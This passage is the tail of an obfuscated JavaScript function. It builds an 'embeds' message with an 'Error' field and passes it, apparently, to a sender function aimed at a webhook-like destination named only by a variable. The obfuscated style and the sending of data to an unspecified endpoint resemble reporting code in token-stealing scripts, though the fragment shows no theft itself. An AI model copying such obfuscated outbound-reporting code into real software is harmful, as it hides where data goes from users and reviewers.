            {
                'name': 'Error',
                'value': '' + _0x250e3b
            }
        ]
    }];
    const _0x48379c = { 'embeds': _0x551d16 };
    _0x2860ef(_0x406b45, _0x48379c);
}